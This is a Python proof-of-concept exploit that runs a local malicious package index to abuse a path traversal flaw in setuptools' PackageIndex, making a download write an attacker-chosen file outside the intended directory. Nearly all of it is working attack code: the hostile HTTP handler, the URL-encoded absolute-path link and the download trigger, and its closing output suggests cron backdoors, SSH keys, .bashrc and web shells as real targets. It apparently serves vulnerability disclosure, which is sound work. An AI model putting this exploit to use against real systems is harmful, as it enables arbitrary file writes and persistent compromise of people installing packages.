#!/usr/bin/env python3
"""
Realistic Attack Scenario: Malicious Package Index

This simulates how an attacker controlling a package index could exploit
the path traversal vulnerability to write arbitrary files when a user
runs: pip install --index-url http://evil-index/ somepackage

The attack flow:
1. User queries the malicious index for a package
2. Index returns HTML with a link containing URL-encoded absolute path
3. setuptools downloads from that URL
4. File is written outside the intended directory

Run: python poc_realistic_attack.py
"""

import http.server
import os
import socketserver
import tempfile
import threading
import time
from urllib.parse import quote
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import setuptools.package_index

TARGET_FILE = "/tmp/PWNED_BY_MALICIOUS_INDEX.txt"
PAYLOAD = b"#!/bin/bash\necho 'You have been compromised!'\n# In a real attack, this could be a cron job, SSH key, or reverse shell\n"


class MaliciousPackageIndex(http.server.BaseHTTPRequestHandler):
    """
    Simulates a malicious PyPI-like package index.

    When queried for package listings, returns HTML with malicious download links.
    """

    def log_message(self, format, *args):
        print(f"    [EVIL INDEX] {args[0]}")

    def do_GET(self):
        from urllib.parse import unquote

        print(f"    [EVIL INDEX] Request: {self.path}")

        if self.path == "/simple/" or self.path == "/simple":
            # Package listing page
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(b"""
<!DOCTYPE html>
<html><head><title>Simple Index</title></head>
<body>
<a href="/simple/malicious-package/">malicious-package</a>
</body>
</html>
""")

        elif "/simple/malicious-package" in self.path:
            # Package detail page - this is where the attack happens
            # We return a link with a URL-encoded absolute path as the filename

            encoded_path = quote(TARGET_FILE, safe='')
            malicious_link = f"/{encoded_path}#md5=d41d8cd98f00b204e9800998ecf8427e"

            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()

            html = f"""
<!DOCTYPE html>
<html><head><title>Links for malicious-package</title></head>
<body>
<h1>Links for malicious-package</h1>
<a href="{malicious_link}">malicious-package-1.0.tar.gz</a><br/>
</body>
</html>
""".encode()
            self.wfile.write(html)
            print(f"    [EVIL INDEX] Served malicious link: {malicious_link}")

        else:
            # Serve the payload for any other request (the actual "download")
            decoded = unquote(self.path)
            print(f"    [EVIL INDEX] Serving payload for: {decoded}")

            self.send_response(200)
            self.send_header('Content-Type', 'application/octet-stream')
            self.send_header('Content-Length', len(PAYLOAD))
            self.end_headers()
            self.wfile.write(PAYLOAD)


def run_attack():
    print("=" * 70)
    print("REALISTIC ATTACK SCENARIO: Malicious Package Index")
    print("=" * 70)

    # Clean up
    if os.path.exists(TARGET_FILE):
        os.remove(TARGET_FILE)

    # Start malicious index
    print("\n[1] Attacker sets up malicious package index...")
    httpd = socketserver.TCPServer(("127.0.0.1", 0), MaliciousPackageIndex)
    port = httpd.server_address[1]
    thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    thread.start()
    time.sleep(0.2)
    print(f"    Malicious index running at: http://127.0.0.1:{port}/simple/")

    # Simulate what happens when user does:
    # pip install --index-url http://127.0.0.1:{port}/simple/ malicious-package
    print("\n[2] Victim runs: pip install --index-url http://evil/ malicious-package")
    print("    (We simulate the setuptools portion of this)")

    index_url = f"http://127.0.0.1:{port}/simple/"

    print(f"\n[3] PackageIndex scans {index_url} for packages...")

    # Create PackageIndex pointing to malicious server
    pi = setuptools.package_index.PackageIndex(index_url=index_url)

    # This is what happens internally - we'll trace through it
    package_url = f"http://127.0.0.1:{port}/simple/malicious-package/"

    print(f"\n[4] Fetching package page: {package_url}")

    # Scan the page - this finds the malicious link
    pi.scan_url(package_url)

    print(f"\n[5] Found download links, attempting download...")

    # Now try to download - this triggers the vulnerability
    with tempfile.TemporaryDirectory() as tmpdir:
        print(f"    Legitimate download dir: {tmpdir}")

        # Get the malicious URL that was found
        # The index served a link like: /%2Ftmp%2FPWNED...
        encoded_target = quote(TARGET_FILE, safe='')
        malicious_url = f"http://127.0.0.1:{port}/{encoded_target}"

        print(f"\n[6] Downloading from malicious URL:")
        print(f"    URL: {malicious_url}")

        # Show the vulnerability
        name, _ = setuptools.package_index.egg_info_for_url(malicious_url)
        print(f"    Extracted filename: {name!r}")
        print(f"    os.path.join(tmpdir, name) = {os.path.join(tmpdir, name)!r}")

        try:
            result = pi._download_url(malicious_url, tmpdir)
            print(f"    Download returned: {result}")
        except Exception as e:
            print(f"    Exception: {e}")

    # Check for success
    print(f"\n[7] Checking for malicious file at {TARGET_FILE}...")

    if os.path.exists(TARGET_FILE):
        print("\n" + "=" * 70)
        print("ATTACK SUCCESSFUL!")
        print("=" * 70)
        print(f"\nMalicious file written to: {TARGET_FILE}")
        print("\nContents:")
        print("-" * 40)
        with open(TARGET_FILE) as f:
            print(f.read())
        print("-" * 40)
        print("\nIn a real attack, this could be:")
        print("  - /etc/cron.d/backdoor     (scheduled reverse shell)")
        print("  - ~/.ssh/authorized_keys   (SSH access)")
        print("  - ~/.bashrc                (code execution on login)")
        print("  - /var/www/html/shell.php  (web shell)")
        return True
    else:
        print("Attack failed - file not created")
        return False


if __name__ == "__main__":
    success = run_attack()
    sys.exit(0 if success else 1)
